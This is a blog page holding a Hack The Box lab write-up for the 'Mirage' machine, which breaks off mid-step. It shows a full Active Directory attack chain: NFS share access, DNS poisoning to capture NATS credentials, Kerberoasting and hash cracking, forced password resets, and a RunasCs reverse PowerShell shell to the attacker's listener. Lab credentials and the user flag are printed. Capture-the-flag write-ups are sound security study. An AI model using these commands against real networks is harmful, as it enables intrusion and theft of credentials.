@@ -1,0 +1,699 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+┌──(kali㉿kali)-[~/HTB/Mirage] └─$ nmap -p- 10.129.115.154 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 00:52 CEST Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan Ping Scan Timing: About 100.00% done; ETC: 00:52 (0:00:00 remaining) Nmap scan report for 10.129.115.154 Host is up (0.027s latency). Not shown: 65505 closed tcp ports (reset) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 111/tcp open rpcbind 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 2049/tcp open nfs 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 4222/tcp open vrml-multi-use 5985/tcp open wsman 9389/tcp open adws 47001/tcp open winrm Detailed port scan At the gedatialized port scan go to get more information from the services which are open on the ip address.
+" />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="http://localhost:1313/writeups/hackthebox-documentations/writeup-mirage/" />
+
+
+    <title>
+        
+             :: Hackthekat home 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.d7ff2d2210fd0ab14f417c6d91d2931b4ecffab189943b30890ff820a24a57c9.css">
+
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+
+  <meta itemprop="name" content="Hackthekat home">
+  <meta itemprop="description" content="Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+┌──(kali㉿kali)-[~/HTB/Mirage] └─$ nmap -p- 10.129.115.154 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 00:52 CEST Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan Ping Scan Timing: About 100.00% done; ETC: 00:52 (0:00:00 remaining) Nmap scan report for 10.129.115.154 Host is up (0.027s latency). Not shown: 65505 closed tcp ports (reset) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 111/tcp open rpcbind 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 2049/tcp open nfs 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 4222/tcp open vrml-multi-use 5985/tcp open wsman 9389/tcp open adws 47001/tcp open winrm Detailed port scan At the gedatialized port scan go to get more information from the services which are open on the ip address.">
+  <meta itemprop="wordCount" content="2940">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Hackthekat home">
+  <meta name="twitter:description" content="Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+┌──(kali㉿kali)-[~/HTB/Mirage] └─$ nmap -p- 10.129.115.154 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 00:52 CEST Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan Ping Scan Timing: About 100.00% done; ETC: 00:52 (0:00:00 remaining) Nmap scan report for 10.129.115.154 Host is up (0.027s latency). Not shown: 65505 closed tcp ports (reset) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 111/tcp open rpcbind 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 2049/tcp open nfs 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 4222/tcp open vrml-multi-use 5985/tcp open wsman 9389/tcp open adws 47001/tcp open winrm Detailed port scan At the gedatialized port scan go to get more information from the services which are open on the ip address.">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">hello</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner">
+            
+            <div class="submenu">
+                <li class="dropdown">
+                    <a href="/posts/">
+                        Blog
+                    </a>
+                </li>
+            </div>
+            
+        
+            
+                <div class="submenu">
+                    <li class="dropdown">
+                        <a href="/hackthebox/">
+                            Hack The Box
+                        </a>
+                        <div class="dropdown-content">
+                            
+                               <a title="Machines" href="/tags/machines/">
+                                   Machines
+                                </a>
+                            
+                        </div>
+                    </li>
+                </div>
+            
+        
+
+    
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            
+                <h2 class="post-title"><a href="http://localhost:1313/writeups/hackthebox-documentations/writeup-mirage/"></a></h2>
+            
+
+
+            
+            
+            
+
+            <div class="post-content">
+                <h1 id="initial-enumeration">Initial Enumeration</h1>
+<h2 id="port-scanning">Port Scanning</h2>
+<h3 id="full-port-scan">Full Port scan</h3>
+<p>As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Mirage]
+└─$ nmap -p- 10.129.115.154
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 00:52 CEST
+Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan
+Ping Scan Timing: About 100.00% done; ETC: 00:52 (0:00:00 remaining)
+Nmap scan report for 10.129.115.154
+Host is up (0.027s latency).
+Not shown: 65505 closed tcp ports (reset)
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+111/tcp   open  rpcbind
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+2049/tcp  open  nfs
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+4222/tcp  open  vrml-multi-use
+5985/tcp  open  wsman
+9389/tcp  open  adws
+47001/tcp open  winrm
+</code></pre><h3 id="detailed-port-scan">Detailed port scan</h3>
+<p>At the gedatialized port scan go to get more information from the services which are open on the ip address.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Mirage]
+└─$ nmap -p53,88,111,135,139,389,445,464,593,636,2049,3268,3269,4222,5985,9389,47001 -sCV 10.129.115.154      
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 00:54 CEST
+Nmap scan report for 10.129.115.154
+Host is up (0.037s latency).
+
+PORT      STATE SERVICE         VERSION
+53/tcp    open  domain          Simple DNS Plus
+88/tcp    open  kerberos-sec    Microsoft Windows Kerberos (server time: 2025-07-22 23:36:19Z)
+111/tcp   open  rpcbind         2-4 (RPC #100000)
+| rpcinfo: 
+///
+|   100003  2,3         2049/udp   nfs
+|   100003  2,3         2049/udp6  nfs
+|   100003  2,3,4       2049/tcp   nfs
+|   100003  2,3,4       2049/tcp6  nfs
+|   100005  1,2,3       2049/tcp   mountd
+|   100005  1,2,3       2049/tcp6  mountd
+|   100005  1,2,3       2049/udp   mountd
+|   100005  1,2,3       2049/udp6  mountd
+///
+135/tcp   open  msrpc           Microsoft Windows RPC
+139/tcp   open  netbios-ssn     Microsoft Windows netbios-ssn
+389/tcp   open  ldap            Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
+| Not valid before: 2025-07-04T19:58:41
+|_Not valid after:  2105-07-04T19:58:41
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http      Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap        Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
+| Not valid before: 2025-07-04T19:58:41
+|_Not valid after:  2105-07-04T19:58:41
+|_ssl-date: TLS randomness does not represent time
+2049/tcp  open  nlockmgr        1-4 (RPC #100021)
+3268/tcp  open  ldap            Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
+| Not valid before: 2025-07-04T19:58:41
+|_Not valid after:  2105-07-04T19:58:41
+3269/tcp  open  ssl/ldap        Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
+| Not valid before: 2025-07-04T19:58:41
+|_Not valid after:  2105-07-04T19:58:41
+4222/tcp  open  vrml-multi-use?
+///
+5985/tcp  open  http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf          .NET Message Framing
+47001/tcp open  http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+///
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+|_clock-skew: 42m01s
+| smb2-time: 
+|   date: 2025-07-22T23:37:07
+|_  start_date: N/A
+</code></pre><p>As you can see, the mount port is open. I will check whether we have rights to access it without a user. You can do this by using the showmount tool.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Mirage]
+└─$ showmount -e mirage.htb    
+Export list for mirage.htb:
+/MirageReports (everyone)
+</code></pre><p>As you can see, we can retrieve files from MirageReports. I will do this by first creating a folder to which you will transfer the data. Once the folder has been created, I will transfer the data using the mount command.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Mirage]
+└─$ sudo mkdir MirageReports   
+[sudo] password for kali: 
+
+┌──(kali㉿kali)-[~/HTB/Mirage]
+└─$ sudo mount -t nfs mirage.htb:/ ./MirageReports -o nolock
+</code></pre><p>As you can see below, we have transferred two PDF files to the machine. I will open them to see if there is any interesting information in them.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Mirage/MirageReports/MirageReports]
+└─$ ls
+Incident_Report_Missing_DNS_Record_nats-svc.pdf  Mirage_Authentication_Hardening_Report.pdf
+</code></pre><p>If you want to view the PDFs, you will first need to move them to the tmp folder, otherwise you will encounter a problem where you cannot view the files. The following commands will enable you to view the files.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Mirage/Mirage]
+└─$ sudo cp Incident_Report_Missing_DNS_Record_nats-svc.pdf /tmp/
+
+┌──(kali㉿kali)-[~/HTB/Mirage/Mirage]
+└─$ sudo chown $USER:$USER /tmp/Incident_Report_Missing_DNS_Record_nats-svc.pdf
+</code></pre><p>In the Incident_report file, you can see that there is a problem with a DNS record. You will therefore need to add a new record to your /etc/hosts file.</p>
+<p>![[Pasted image 20250725095049.png]]</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
+└─$ cat /etc/hosts                             
+10.129.115.154 mirage.htb dc01.mirage.htb nats-svc.mirage.htb
+</code></pre><p>Within the PDF file, I also noticed that there is a user named “Dev_Account_A.” I will enumerate this user to see if I can find a password for it. The passwords I will test are those I found while running my exiftool on the PDF files.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Mirage/Mirage]
+└─$ sudo exiftool * pdf
+[sudo] password for kali: 
+======== Incident_Report_Missing_DNS_Record_nats-svc.pdf
+Keywords                        : DAGn7vmxkJQ, BAFmAHycaxU, 0
+Author                          : Mostafa Toumi (EmSec)
+======== Mirage_Authentication_Hardening_Report.pdf
+Keywords                        : DAGoYb7hCCM, BAFmAHycaxU, 0
+Author                          : Mostafa Toumi (EmSec)
+Error: File not found - pdf
+    2 image files read
+    1 files could not be read
+</code></pre><p>When executing this command, I came across a relevant knowledge article that explains how the process works.
+Using the echo command, I send a specially formatted INFO message to a listener on port 4222 on my own machine. This causes the target server to initiate a connection and then send back a CONNECT message with the corresponding authentication data.</p>
+<p>I found the exact information I need to use in the echo command by accessing the domain name nats-svc.mirage.htb.</p>
+<p>Important: If I do not send an INFO message to the target before it connects, the system will not send a CONNECT message back.</p>
+<p>Finally, I use nsupdate to force the target machine to connect to my port 4222, via a custom DNS entry: <a href="https://docs.nats.io/reference/reference-protocols/nats-protocol#info">https://docs.nats.io/reference/reference-protocols/nats-protocol#info</a></p>
+<table>
+  <thead>
+      <tr>
+          <th>Username</th>
+          <th>Password</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Dev_Account_A</td>
+          <td>hx5h7F5554fP@1337!</td>
+      </tr>
+  </tbody>
+</table>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
+└─$ echo &#39;INFO {&#34;server_id&#34;:&#34;Zk0GQ3JBSrg3oyxCRRlE09&#34;,&#34;version&#34;:&#34;1.2.0&#34;,&#34;proto&#34;:1,&#34;go&#34;:&#34;go1.10.3&#34;,&#34;host&#34;:&#34;0.0.0.0&#34;,&#34;port&#34;:4222,&#34;max_payload&#34;:1048576,&#34;client_id&#34;:2392}&#39; | nc -lvnp 4222
+listening on [any] 4222 ...
+connect to [10.10.16.25] from (UNKNOWN) [10.129.115.154] 52137
+CONNECT {&#34;verbose&#34;:false,&#34;pedantic&#34;:false,&#34;user&#34;:&#34;Dev_Account_A&#34;,&#34;pass&#34;:&#34;hx5h7F5554fP@1337!&#34;,&#34;tls_required&#34;:false,&#34;name&#34;:&#34;NATS CLI Version 0.2.2&#34;,&#34;lang&#34;:&#34;go&#34;,&#34;version&#34;:&#34;1.41.1&#34;,&#34;protocol&#34;:1,&#34;echo&#34;:true,&#34;headers&#34;:false,&#34;no_responders&#34;:false}
+PING
+
+┌──(kali㉿kali)-[~/HTB/Mirage/natscli/nats-0.2.4-linux-amd64]
+└─$ nsupdate
+&gt; server 10.129.115.154
+&gt; update add nats-svc.mirage.htb 3600 A 10.10.16.25
+&gt; send
+</code></pre><p>Once I had a username and password, I started looking at what I could do with the <code>nats</code> command. This led me to two different things.</p>
+<ul>
+<li>Jetstream consumer management</li>
+<li>Jetstream stream management</li>
+</ul>
+<p>First, I tried to see if I could check the logs of the consumers, but there were no logs to be found. I then looked in the stream logs and found a username and password there.</p>
+<table>
+  <thead>
+      <tr>
+          <th>Username</th>
+          <th>Password</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>david.jjackson</td>
+          <td>pN8kQmn6b86!1234@</td>
+      </tr>
+  </tbody>
+</table>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Mirage/natscli/nats-0.2.4-linux-amd64]
+└─$ ./nats --server nats://10.129.115.154:4222 --user=&#39;Dev_Account_A&#39; --password=&#39;hx5h7F5554fP@1337!&#39; stream view auth_logs
+[1] Subject: logs.auth Received: 2025-05-05 09:18:56
+{&#34;user&#34;:&#34;david.jjackson&#34;,&#34;password&#34;:&#34;pN8kQmn6b86!1234@&#34;,&#34;ip&#34;:&#34;10.10.10.20&#34;}
+
+[2] Subject: logs.auth Received: 2025-05-05 09:19:24
+{&#34;user&#34;:&#34;david.jjackson&#34;,&#34;password&#34;:&#34;pN8kQmn6b86!1234@&#34;,&#34;ip&#34;:&#34;10.10.10.20&#34;}
+
+[3] Subject: logs.auth Received: 2025-05-05 09:19:25
+{&#34;user&#34;:&#34;david.jjackson&#34;,&#34;password&#34;:&#34;pN8kQmn6b86!1234@&#34;,&#34;ip&#34;:&#34;10.10.10.20&#34;}
+
+[4] Subject: logs.auth Received: 2025-05-05 09:19:26
+{&#34;user&#34;:&#34;david.jjackson&#34;,&#34;password&#34;:&#34;pN8kQmn6b86!1234@&#34;,&#34;ip&#34;:&#34;10.10.10.20&#34;}
+
+[5] Subject: logs.auth Received: 2025-05-05 09:19:27
+{&#34;user&#34;:&#34;david.jjackson&#34;,&#34;password&#34;:&#34;pN8kQmn6b86!1234@&#34;,&#34;ip&#34;:&#34;10.10.10.20&#34;}
+
+05:55:54 Reached apparent end of data
+</code></pre><p>Using these user credentials, I retrieved the data from the LDAP server. I will upload this to Bloodhound so that I can analyse it.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Mirage]
+└─$ sudo bloodhound-python -u &#39;david.jjackson&#39; -p &#39;pN8kQmn6b86!1234@&#39; -d mirage.htb -dc dc01.mirage.htb -ns 10.129.115.154 -c all --zip
+INFO: Compressing output into 20250723063426_bloodhound.zip
+</code></pre><p>I realized that I could perform a Kerberos attack. I did this using the targetkerboast.py tool, which gave me the hash for the user <code>nathan.aadam</code>. I will put this hash in a file and try to crack it using john.</p>
+<p>![[Pasted image 20250725095029.png]]</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Mirage]
+└─$ python targetedKerberoast/targetedKerberoast.py -v -d &#39;mirage.htb&#39; --dc-host dc01.mirage.htb -u &#39;david.jjackson&#39; -p &#39;pN8kQmn6b86!1234@&#39; -k
+[*] Starting kerberoast attacks
+[*] Fetching usernames from Active Directory with LDAP
+[+] Printing hash for (nathan.aadam)
+$krb5tgs$23$*nathan.aadam$MIRAGE.HTB$mirage.htb/nathan.aadam*$6c7aaf66537626958d39c1384c6745f8$5edf87f75c9bfbf1e480e1409c1b6d909a409f04774ffddd6b6d8d814a4da0b2071a62cfbd9ec89d4a725921529295cabfd3d46eff00bbb7b213c1c64959726fd631df5641e1bcaf0ebd9e405377ebb79af26be3f2dec08a363995f87070376d7436eea02585c1279405fdb21fa3bc43449d94a1a313aed659c1cc11b47a95119c6b1df5de82f2459b48bd0ceeea1964a80ed8b51c0e9fa6830abd4f8c748020e7ba1c09f7d17ef510cfe5e4c6e43c2cf110e00b34c8f2664aae8e5a72322ae962f506a2a4ff8073918af9a8930df79ab84a0eafbe1b9264985e6faffbc2a06c571ddbfb93d50eb6cdc373741430b9f45b948e776054b0d8fe43e417df98b9dfb73622d0bbe102a975579d01a307143b756f831a0113efa91953044137a5a3e45d9d627427076bfbcc5b2aee453c8d503fd072f938b6b45f55b1f339efcc271b666ba3cfc3cdfb95083e2e986d0781866172eb05d055bf4f3a89cdd902cf394fc6273e281678bd521a16f85df8bc131050d79e8e99a13cc026a7eaf214b7c4f7990c8b5f21bda424383ea6ce68d9afbc137ed6fb5062dffe96aabf5303e56cf62f6e93b8ad378860c8842216fe2252060c462e2b4d8a9b2d9516e7c450844740c29b5f0d7a0b8ee0f818849a474fa19bd61cd8794a9bfc31b31f11b8a80e51a47a7d37ebfe0b3ae9f3f59d9272a3efcee3c8601b8baeedab88d3efda1e3118ff68ebcc96d2d97f862737a5f00016685239f0da9ae6bd76d17627228cfef3254bf21e7304db16f9f674a610c2253704ce1589b316db6de69cd47ed4a545adcab916628b824abd071bf53e2c1426ee8d84905d8eaded393935c2994270107c972241bb6722b9f85c824c4dbfb90402ed94c18f3219cb3f23913be0144fd782044b397c658a347b8edea0c8d80a2cd29538a6f48d3cf1686436989506e06f4ca491935b23d905fdd3ab99a82f859f71dfa7059dc0e2c294ccedc154e9f3ec8ae5104d10defb80693f45e527a35bd7b4dba704304a2f54bdbe0c9b5f682e318c4acc503963eba9805fc6da3ca155ae4d9e37d829a78689cb9ae4480fb0b578a6923eb519c5bdd8debc7de89d377153c0e9a5978c6cbbe0a713ee580ee19bd0e120a8ca7f748e8d5e627ec60ca211f2a86a3092d54a4132433e17fcf860a089fce9b570a3943b166f4ad2a66fc6c2a009dd5646aacfb88b54a0eb8a717ac23b60d22ac8d4da7a59f8cd05c56c560bd7b3341a5d6142c486287a2c8b05f1acb9432f88f64b52ac9267e346dd0da34e368b80efe469eb555060d158acfdfa3960072da3e81d83897709e9789a980ec5790f0f6411fa2b462aa7f996149b7bdddc4e623a82db190cb05bf3456d0af14efd1a3133cefeae79ff6ff0614ce5f48fdb8f91bd0c5678782f9a15c2617f98b67cecd1ca77ff851dbbef7273e4236509807caa0298133e8c404ccce14bf70906141397dcc21a6f08cf797675b719290bbbe9f319dddf59b9d32b250ae10fee8b0b30244992430584800792049301f59ef827180b7c4f803d1e442aa91694f3766073478642aeae9e02c564cf13
+</code></pre><p>I am now cracking the hash using John.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Mirage]
+└─$ sudo nano hash                                                       
+
+┌──(kali㉿kali)-[~/HTB/Mirage]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash    
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 4 OpenMP threads
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+3edc#EDC3        (?)     
+1g 0:00:00:04 DONE (2025-07-23 07:01) 0.2298g/s 2866Kp/s 2866Kc/s 2866KC/s 3er733..3ddfiebw
+Use the &#34;--show&#34; option to display all of the cracked passwords reliably
+Session completed.
+</code></pre><p>First, we will create a TGT ticket, export it, and then connect to the Windows server.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Mirage]
+└─$ sudo impacket-getTGT mirage.htb/nathan.aadam:&#39;3edc#EDC3&#39; -dc-ip 10.129.115.154 [*] Saving ticket in nathan.aadam.ccache
+
+┌──(kali㉿kali)-[~/HTB/Mirage]
+└─$ export KRB5CCNAME=nathan.aadam.ccache                  
+
+┌──(kali㉿kali)-[~/HTB/Mirage]
+└─$ evil-winrm -i dc01.mirage.htb -u nathan.aadam -r mirage.htb
+
+*Evil-WinRM* PS C:\Users\nathan.aadam\Documents&gt;
+</code></pre><p>As you can see above, we have been able to connect to the server and can now obtain the user flag.</p>
+<p>user flag: 55a5da40e87c7f8347700a1a878727f8</p>
+<pre tabindex="0"><code>*Evil-WinRM* PS C:\Users\nathan.aadam\Desktop&gt; ls
+
+
+    Directory: C:\Users\nathan.aadam\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----          7/4/2025   1:01 PM           2312 Microsoft Edge.lnk
+-ar---         7/22/2025  11:18 AM             34 user.txt
+
+
+*Evil-WinRM* PS C:\Users\nathan.aadam\Desktop&gt; cat user.txt
+55a5da40e87c7f8347700a1a878727f8
+</code></pre><p>Now I am using <code>Get-ItemProperty</code> to see if I can find any automatic logon credentials within the machine. You can do this by using the following command.</p>
+<pre tabindex="0"><code>*Evil-WinRM* PS C:\Users&gt; Get-ItemProperty &#34;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&#34; | 
+Select-Object DefaultUserName, DefaultDomainName, DefaultPassword, AutoAdminLogon
+
+DefaultUserName DefaultDomainName DefaultPassword AutoAdminLogon
+--------------- ----------------- --------------- --------------
+mark.bbond      MIRAGE            1day@atime      1
+</code></pre><p>Using this user&rsquo;s credentials, I checked Bloodhound to see if I could do anything with this user. If you take a look, you will see that you can change the password of the user <code>Javier.MMarshall</code>.</p>
+<p>![[Pasted image 20250725095005.png]]</p>
+<p>You can do this by first creating a TGTticket, then exporting it so that it will take the authentication from there, and then using the bloodyAD tool to change the password.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Mirage]
+└─$ sudo impacket-getTGT -dc-ip 10.129.209.204 mirage.htb/&#39;mark.bbond&#39;:&#39;1day@atime&#39; -k
+[sudo] password for kali: 
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in mark.bbond.ccache
+
+┌──(kali㉿kali)-[~/HTB/Mirage]
+└─$ export KRB5CCNAME=mark.bbond.ccache
+
+┌──(kali㉿kali)-[~/HTB/Mirage]
+└─$ KRB5CCNAME=mark.bbond.ccache bloodyAD -k  --host dc01.mirage.htb -d mirage.htb -u &#39;mark.bbond&#39; -p &#39;1day@atime&#39; set password javier.mmarshall &#39;Newpassword123&#39;
+[+] Password changed successfully!
+</code></pre><p>I then attempted to set up a session with the Windows machine, but the user I wanted to connect to appeared to be disabled. I then attempted to connect to the Windows server via the <code>mark.bbond</code> account. However, this user is not authorized to log in via Evil-WinRM, presumably due to missing privileges or because WinRM login is restricted for this account.</p>
+<p>As an alternative, I am now setting up a PowerShell connection between the target machine and my Kali machine. To do this, I log in again as nathan.aadam, as I did successfully earlier.</p>
+<p>Next, I upload the C# file RunasCs.cs to the target machine. This tool will be used to execute code under a different user context. At the same time, I start a listener on my Kali machine so that I can capture and analyse the incoming connection from the target host.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Mirage/RunasCs]
+└─$ evil-winrm -i dc01.mirage.htb -u nathan.aadam -r mirage.htb
+
+*Evil-WinRM* PS C:\Users\nathan.aadam\Documents&gt; upload RunasCs.cs
+
+Info: Uploading /home/kali/HTB/Mirage/RunasCs/RunasCs.cs to C:\Users\nathan.aadam\Documents\RunasCs.cs
+
+Info: Upload successful!
+</code></pre><p>Creating the RunasCs_net2.exe application.</p>
+<pre tabindex="0"><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -target:exe -optimize -out:RunasCs_net2.exe RunasCs.cs
+</code></pre><p>Connect to your own machine using netcat.</p>
+<pre tabindex="0"><code>Windows connection
+
+*Evil-WinRM* PS C:\Users\nathan.aadam\Documents&gt; .\RunasCs_net2.exe mark.bbond 1day@atime Powershell.exe -r 10.10.14.37:4444
+
+Own kali machine
+┌──(kali㉿kali)-[~/HTB/Mirage/RunasCs]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.37] from (UNKNOWN) [10.129.209.204] 60413
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Windows\system32&gt;
+</code></pre><p>If you check using the following command, you will see that the account is not active.</p>
+<pre tabindex="0"><code>PS C:\Windows\system32&gt; net user javier.mmarshall
+net user javier.mmarshall
+Account active               No
+Account expires              Never
+         
+The command completed successfully.
+</code></pre><p>You can change this by using the <code>set-aduser</code> command.</p>
+<pre tabindex="0"><code>S C:\Windows\system32&gt; Set-ADUser -Identity javier.mmarshall -Enabled $true
+Set-ADUser -Identity javier.mmarshall -Enabled $true
+PS C:\Windows\system32&gt; net user javier.mmarshall
+
+Account active               Yes
+Account expires              Never
+       
+The command completed successfully.
+</code></pre><p>I also noticed something else: we can&rsquo;t log in because no login hours are allowed.</p>
+<pre tabindex="0"><code>PS C:\Windows\system32&gt; net user javier.mmarshall
+
+Password last set            7/23/2025 4:57:53 PM
+Logon hours allowed          None
+Local Group Memberships
+</code></pre><p>This means that even if you have enabled the account, you will still need to set it to allowed in order to log in as this user. You can do this by using the following command.</p>
+<pre tabindex="0"><code>PS C:\Windows\system32&gt; Set-ADUser -Identity &#34;javier.mmarshall&#34; -Replace @{logonHours=([byte[]](0xFF)*21)}
+</code></pre><h3 id="what-is-gmsa-and-how-can-we-misuse-it">What is gMSA and how can we misuse it?</h3>
+<p>During my research, I discovered that there are two ways to exploit a gMSA (Group Managed Service Account). If the gMSA account is already active on a machine, I can steal the token from the process or inject myself, just like with a normal user session.</p>
+<p>If the account is not yet active, I can start a scheduled task or service under the gMSA. This automatically logs the account in, after which I can apply the same techniques to gain access.</p>
+<p>After I had modified the account, I wanted to remotely retrieve the gMSA password and convert it to an NT hash. The <code>gMSADumper</code> tool did not work for this, but with <code>BloodyAD</code> I was able to do so using the following command.</p>
+<p>![[Pasted image 20250725101334.png]]</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Mirage/gMSADumper]
